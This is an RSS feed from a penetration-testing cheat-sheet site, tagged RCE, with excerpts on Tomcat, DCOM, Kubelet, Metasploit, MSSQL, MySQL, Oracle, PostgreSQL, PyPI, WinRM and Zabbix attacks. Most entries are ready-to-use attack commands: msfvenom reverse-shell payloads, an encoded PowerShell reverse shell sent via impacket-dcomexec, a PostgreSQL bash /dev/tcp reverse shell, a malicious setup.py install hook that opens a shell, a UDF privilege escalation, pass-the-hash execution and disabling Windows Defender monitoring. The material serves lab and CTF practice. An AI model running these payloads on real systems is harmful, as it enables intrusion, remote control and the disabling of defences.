<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>RCE on TLDRBins</title>
    <link>https://tldrbins.github.io/@rce/</link>
    <description>Recent content in RCE on TLDRBins</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    <atom:link href="https://tldrbins.github.io/@rce/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Apache Tomcat</title>
      <link>https://tldrbins.github.io/apache_tomcat/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/apache_tomcat/</guid>
      <description>Config Location /usr/share/tomcat9/etc/tomcat-users.xml /etc/tomcat9/tomcat-users.xml RCE (Authenicated) 1. Create a WAR File msfvenom -p java/shell_reverse_tcp LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; -f war -o revshell.war $ msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.31 LPORT=1337 -f war -o revshell.war Payload size: 13029 bytes Final size of war file: 13029 bytes Saved as: revshell.war 2. Start a Listener rlwrap nc -lvnp &amp;lt;LOCAL_PORT&amp;gt; $ rlwrap nc -lvnp 1337 listening on [any] 1337 .. 3a. Manager GUI 3b. Manager Script +--------------------------------------------+ | Exploit | +--------------------------------------------+ | 1.</description>
    </item>
    <item>
      <title>ExecuteDCOM</title>
      <link>https://tldrbins.github.io/executedcom/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/executedcom/</guid>
      <description>Abuse #1: ExecuteDCOM Linux # Revshell impacket-dcomexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; &amp;#39;&amp;lt;POWERSHELL_3_BASE64&amp;gt;&amp;#39; -silentcommand -object MMC20 $ impacket-dcomexec jab.htb/svc_openfire:&amp;#39;!@#$%^&amp;amp;*(1qazxsw&amp;#39;@10.10.11.4 &amp;#39;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAxACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=&amp;#39; -silentcommand -object MMC20 Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra </description>
    </item>
    <item>
      <title>Kubelet</title>
      <link>https://tldrbins.github.io/kubelet/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/kubelet/</guid>
      <description>General # List all the pods on the node kubeletctl pods -s &amp;lt;TARGET&amp;gt; # List running pods kubeletctl runningpods -s &amp;lt;TARGET&amp;gt; # Exec command kubeletctl exec &amp;#34;/bin/bash&amp;#34; -p &amp;lt;POD_NAME&amp;gt; -c &amp;lt;CONTAINER_NAME&amp;gt; -s &amp;lt;TARGET&amp;gt; Ref: kubeletctl</description>
    </item>
    <item>
      <title>Metasploit Shellcode</title>
      <link>https://tldrbins.github.io/metasploit_shellcode/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/metasploit_shellcode/</guid>
      <description>Generate Shellcode Note: stageless payload can catch with nc directly&#xA;Windows x64 (64-bit) Staged exe Stageless exe Staged dll Stageless dll msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.exe $ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.31 LPORT=1337 &amp;gt; rev.exe No encoder specified, outputting raw payload Payload size: 510 bytes Final size of exe file: 7168 bytes msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f exe --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.</description>
    </item>
    <item>
      <title>MSSQL Privilege Escalation</title>
      <link>https://tldrbins.github.io/mssql_privilege_escalation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mssql_privilege_escalation/</guid>
      <description>Enum Linux Windows 1. List Users that Can be Impersonated nxc mssql &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --local-auth -M enum_impersonate $ nxc mssql DC.REDELEGATE.VL -u &amp;#39;SQLGuest&amp;#39; -p &amp;#39;zDPBpaF4FywlqIv11vii&amp;#39; --local-auth -M enum_impersonate MSSQL 10.129.254.242 1433 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl) MSSQL 10.129.254.242 1433 DC [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii ENUM_IMP... 10.129.254.242 1433 DC [-] No users with impersonation rights found. 2. Enumerate Active MSSQL Logins nxc mssql &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --local-auth -M enum_logins $ nxc mssql DC.</description>
    </item>
    <item>
      <title>MySQL Privilege Escalation</title>
      <link>https://tldrbins.github.io/mysql_privilege_escalation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mysql_privilege_escalation/</guid>
      <description>Abuse #1: User Defined Function (UDF) # Get the raptor_udf2.c wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c # Compile the source script gcc -g -c raptor_udf2.c gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc # Copy to target folder cp raptor_udf2.so /dev/shm/raptor_udf2.so # Connect to database as root mysql -u root -p&amp;lt;PASSWORD&amp;gt; mysql # UDF create table foo(line blob); insert into foo values(load_file(&amp;#39;/dev/shm/raptor_udf2.so&amp;#39;)); # Get plug-in directory show variables like &amp;#39;%plugin%&amp;#39;; +-----------------+---------------------------------------------+ | Variable_name | Value | +-----------------+---------------------------------------------+ | plugin_dir | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ | | plugin_maturity | gamma | +-----------------+---------------------------------------------+ # Copy the plugin_dir value select * from foo into dumpfile &amp;#39;/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.</description>
    </item>
    <item>
      <title>Oracle Database</title>
      <link>https://tldrbins.github.io/oracledb_general/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/oracledb_general/</guid>
      <description>Tools sqlplus ODAT # Installation sudo apt install oracle-instantclient-sqlplus # export LD_LIBRARY_PATH export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH} # Check sqlplus -V # Installation sudo apt install odat # Check odat --version Ref: Download ODAT&#xA;Enum # SID enum (You only need one) odat sidguesser -s &amp;lt;TARGET&amp;gt; $ ./odat-libc2.17-x86_64 sidguesser -s 10.129.95.188 [1] (10.129.95.188:1521): Searching valid SIDs [1.1] Searching valid SIDs thanks to a well known SID list on the 10.129.95.188:1521 server [+] &amp;#39;XE&amp;#39; is a valid SID.</description>
    </item>
    <item>
      <title>PostgreSQL</title>
      <link>https://tldrbins.github.io/postgresql_general/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/postgresql_general/</guid>
      <description>Connect psql -h &amp;lt;TARGET&amp;gt; -U &amp;lt;USER&amp;gt; psql -h &amp;lt;TARGET&amp;gt; -U &amp;lt;USER&amp;gt; -p &amp;lt;PORT&amp;gt; -d &amp;lt;DB_NAME&amp;gt; psql &amp;#39;postgresql://&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;:5432/&amp;lt;DB_NAME&amp;gt;&amp;#39; General # Show databases \list # Use database \connect &amp;lt;DB_NAME&amp;gt; # Show tables \dt # Disable pager \pset pager 0 # Dump from table select * from &amp;#34;&amp;lt;TABLE_NAME&amp;gt;&amp;#34;; # Insert into table insert into &amp;#34;&amp;lt;TABLE_NAME&amp;gt;&amp;#34; (&amp;lt;COLUMN_1&amp;gt;, &amp;lt;COLUMN_2&amp;gt;) values (&amp;#39;&amp;lt;VALUE_1&amp;gt;&amp;#39;, &amp;#39;&amp;lt;VALUE_2&amp;gt;&amp;#39;); # Update table update &amp;#34;&amp;lt;TABLE_NAME&amp;gt;&amp;#34; set &amp;lt;COLUMN_1&amp;gt; = &amp;#39;&amp;lt;VALUE_1&amp;gt;&amp;#39; where &amp;lt;COLUMN_2&amp;gt; = &amp;#39;&amp;lt;VALUE_2&amp;gt;&amp;#39;; # Write text copy (select &amp;#39;&amp;lt;STRING&amp;gt;&amp;#39;) to &amp;#39;&amp;lt;TARGET_PATH&amp;gt;&amp;#39;; # List all user accounts \du+ # Exit \q File Read # List directory SELECT * FROM pg_ls_dir(&amp;#39;&amp;lt;DIR_PATH&amp;gt;&amp;#39;); # File read SELECT pg_read_file(&amp;#39;&amp;lt;FILE_PATH&amp;gt;&amp;#39;, 0, 4096); RCE # Only for superuser CREATE TABLE IF NOT EXISTS exec(string text); # Code execution COPY exec FROM PROGRAM &amp;#39;&amp;lt;CMD&amp;gt;&amp;#39;; # Check ouput SELECT * FROM exec; # One-liner DO $$ DECLARE c text; BEGIN c := &amp;#39;COPY (SELECT &amp;#39;&amp;#39;&amp;#39;&amp;#39;) to program &amp;#39;&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;LOCAL_IP&amp;gt;/&amp;lt;PORT&amp;gt; 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;&amp;#39;&amp;#39;; EXECUTE c; END $$; </description>
    </item>
    <item>
      <title>Pypi</title>
      <link>https://tldrbins.github.io/pypi/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/pypi/</guid>
      <description>Abuse #1: Remote Pypi Server 1. Create files mkdir evil_package mkdir evil_package/evil_package cd evil_package touch README.md touch evil_package/__init__.py touch setup.cfg touch setup.py 2. Replace setup.py #!/usr/bin/env python3 from setuptools.command.install import install from setuptools import setup import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&amp;#34;&amp;lt;LOCAL_IP&amp;gt;&amp;#34;,&amp;lt;LOCAL_PORT&amp;gt;)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call([&amp;#34;/bin/sh&amp;#34;, &amp;#34;-i&amp;#34;]) setup(name=&amp;#34;evil_package&amp;#34;, version=&amp;#34;1.0.0&amp;#34;, description=&amp;#34;Evil Package&amp;#34;, author=&amp;#34;user&amp;#34;, author_email=&amp;#34;user@&amp;lt;DOMAIN&amp;gt;&amp;#34;, url=&amp;#34;http://&amp;lt;DOMAIN&amp;gt;&amp;#34;, license=&amp;#34;MIT&amp;#34;, zip_safe=False, cmdclass={&amp;#34;install&amp;#34;: Exploit}) 3.</description>
    </item>
    <item>
      <title>Winrm</title>
      <link>https://tldrbins.github.io/winrm/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/winrm/</guid>
      <description>PsExec Password NTLM # Domain auth impacket-psexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; # Local auth impacket-psexec &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; # Domain auth impacket-psexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; # Local auth impacket-psexec &amp;#39;&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; AtExec Password NTLM # Local auth impacket-atexec &amp;#39;&amp;lt;WORKGROUP&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt;&amp;#39; &amp;#39;powershell.exe -c &amp;#34;&amp;lt;CMD&amp;gt;&amp;#34;&amp;#39; # Local auth impacket-atexec &amp;#39;&amp;lt;WORKGROUP&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; &amp;#39;powershell.exe -c &amp;#34;&amp;lt;CMD&amp;gt;&amp;#34;&amp;#39; $ impacket-atexec -hashes :a29542cb2707bf6d6c1d2c9311b0ff02 &amp;#39;WS01/administrator@WS01.example.com&amp;#39; &amp;#39;powershell.exe -c &amp;#34;Set-MpPreference -DisableRealtimeMonitoring $true&amp;#34;&amp;#39; Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [!] This will work ONLY on Windows &amp;gt;= Vista [*] Creating task \gNBJCrJi [*] Running task \gNBJCrJi [*] Deleting task \gNBJCrJi [*] Attempting to read ADMIN$\Temp\gNBJCrJi.</description>
    </item>
    <item>
      <title>Zabbix</title>
      <link>https://tldrbins.github.io/zabbix/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/zabbix/</guid>
      <description>Zabbix 7.0+ API Check Zabbix Version curl -s &amp;lt;TARGET&amp;gt;/zabbix/api_jsonrpc.php -H &amp;#39;Content-Type: application/json-rpc&amp;#39; -d &amp;#39;{&amp;#34;jsonrpc&amp;#34;:&amp;#34;2.0&amp;#34;,&amp;#34;method&amp;#34;:&amp;#34;apiinfo.version&amp;#34;,&amp;#34;params&amp;#34;:{},&amp;#34;id&amp;#34;:1}&amp;#39; | jq . ┌──(kali㉿kali)-[~] └─$ curl -s http://unrested.htb/zabbix/api_jsonrpc.php -H &amp;#39;Content-Type: application/json-rpc&amp;#39; -d &amp;#39;{&amp;#34;jsonrpc&amp;#34;:&amp;#34;2.0&amp;#34;,&amp;#34;method&amp;#34;:&amp;#34;apiinfo.version&amp;#34;,&amp;#34;params&amp;#34;:{},&amp;#34;id&amp;#34;:1}&amp;#39; | jq . { &amp;#34;jsonrpc&amp;#34;: &amp;#34;2.0&amp;#34;, &amp;#34;result&amp;#34;: &amp;#34;7.0.0&amp;#34;, &amp;#34;id&amp;#34;: 1 } Authentication curl -s &amp;lt;TARGET&amp;gt;/zabbix/api_jsonrpc.php -H &amp;#39;Content-Type: application/json-rpc&amp;#39; -d &amp;#39;{&amp;#34;jsonrpc&amp;#34;:&amp;#34;2.0&amp;#34;,&amp;#34;method&amp;#34;:&amp;#34;user.login&amp;#34;,&amp;#34;params&amp;#34;:{&amp;#34;username&amp;#34;:&amp;#34;&amp;lt;USER&amp;gt;&amp;#34;,&amp;#34;password&amp;#34;:&amp;#34;&amp;lt;PASSWORD&amp;gt;&amp;#34;},&amp;#34;id&amp;#34;:1}&amp;#39; | jq . ┌──(kali㉿kali)-[~] └─$ curl -s http://unrested.htb/zabbix/api_jsonrpc.php -H &amp;#39;Content-Type: application/json-rpc&amp;#39; -d &amp;#39;{&amp;#34;jsonrpc&amp;#34;:&amp;#34;2.0&amp;#34;,&amp;#34;method&amp;#34;:&amp;#34;user.login&amp;#34;,&amp;#34;params&amp;#34;:{&amp;#34;username&amp;#34;:&amp;#34;matthew&amp;#34;,&amp;#34;password&amp;#34;:&amp;#34;96qzn0h2e1k3&amp;#34;},&amp;#34;id&amp;#34;:1}&amp;#39; | jq . { &amp;#34;jsonrpc&amp;#34;: &amp;#34;2.0&amp;#34;, &amp;#34;result&amp;#34;: &amp;#34;d983875587424cdbc8d3182166e11580&amp;#34;, &amp;#34;id&amp;#34;: 1 } Get Users curl -s &amp;lt;TARGET&amp;gt;/zabbix/api_jsonrpc.</description>
    </item>
  </channel>
</rss>
